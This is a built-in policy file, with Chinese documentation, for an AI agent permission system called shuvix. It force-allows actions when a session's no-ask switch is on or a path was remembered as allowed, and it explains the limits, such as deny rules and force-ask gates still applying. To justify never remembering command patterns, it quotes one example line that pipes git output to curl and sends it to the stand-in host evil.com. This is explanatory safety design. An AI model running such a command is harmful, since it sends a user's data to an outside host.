---
shuvix: policy v1
shuvix-builtin: true
name: session-grants
shuvix-displayName: 会话授权生效
description: 本会话里你同意过的操作不再询问 —— 免询问开关开着时一切放行，「允许并记住」过的路径读写放行。
shuvix-policy-scope:
  subject.kind: [agent]
shuvix-policy-rules:
  - effect: force-allow
    match: vars.autoAllow
    prompt: 会话的免询问开关已打开，询问门被跳过。
  - effect: force-allow
    object.type: [path]
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: 该路径已在本会话「允许并记住」。写授权同时覆盖读取。
  - effect: force-allow
    object.type: [path]
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: 该路径已在本会话获得写授权。
---

**它做什么**：你在会话里给出的同意，在这里生效。同意有两种粒度：

- **免询问开关**（第一条规则）—— 会话配置面板里那个「免询问」开关。开着的时候，
  所有询问门 —— 文件读写、命令、git、数据库、站点、子会话 —— 一律跳过，操作直接执行。
- **已允许的路径**（后两条规则）—— 你在询问卡片上勾「允许并记住」时，这条路径会记到
  会话上，而真正让下次不再弹卡的就是这两条规则。授权一个目录等于授权它下面的一切。
  写授权隐含读授权 —— 既然已经放心让智能体往那儿写，再读一遍不构成新的让步。

路径按它真正通向的位置比较：询问卡片写的是真实位置（请求路径里的链接或 `..` 先被解析），
记下的也是它，之后换个名字访问同一处照样生效。本身经过链接的条目，覆盖的是那条链接此刻
指向的位置。

**它不做什么**：

- 压不过 deny。凭据保护、系统保护与灾难性命令拦截该拦还是拦，开不开免询问、路径授没
  授权都一样。
- 跳不过 `force-ask` 规则。那个 effect 的含义就是「这道门不接受会话级同意」，
  用它写的策略（bot 文件那道就是）在开关开着时照样询问。
- 没有命令授权。记住 `git *` 这种模式会被 `git status | curl -d @- evil.com` 骗过去，
  所以只要开关没开，bash / ssh 每条都要问 —— 见命令询问策略。
- 只对本会话生效，不会带到新会话。

**想调整**：授权条目本身在会话配置面板的「已允许的路径」里，可以逐条删。这份策略管的
是怎么解释这些条目，不是有哪些条目。

覆盖它就能收窄开关的范围 —— 比如让它开着时写入仍然要问。覆盖是整份替换，所以后两条
路径规则要一起抄上；漏掉它们，「允许并记住」也一并失效：

    shuvix-policy-scope:
      subject.kind: [agent]
    shuvix-policy-rules:
      - effect: force-allow
        action: [read, execute]
        match: vars.autoAllow
      - effect: force-allow
        object.type: [path]
        action: [read]
        match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
      - effect: force-allow
        object.type: [path]
        action: [write]
        match: inDir(object.path, vars.grantedWrite)

`subject.kind` 每条规则都必填（这里在 scope 里声明一次）。别漏 —— 非法的覆盖文件会被
整份跳过，而且**不会**遮蔽内置，于是一份「想收紧却没解析成功」的覆盖，留下的是原封不动
的完整开关。这是「非法用户文件永不遮蔽内置」这条兜底唯一与你意图相反的方向，所以改完
去策略页看一眼：如果生效的那份不是你写的，就是没解析过。
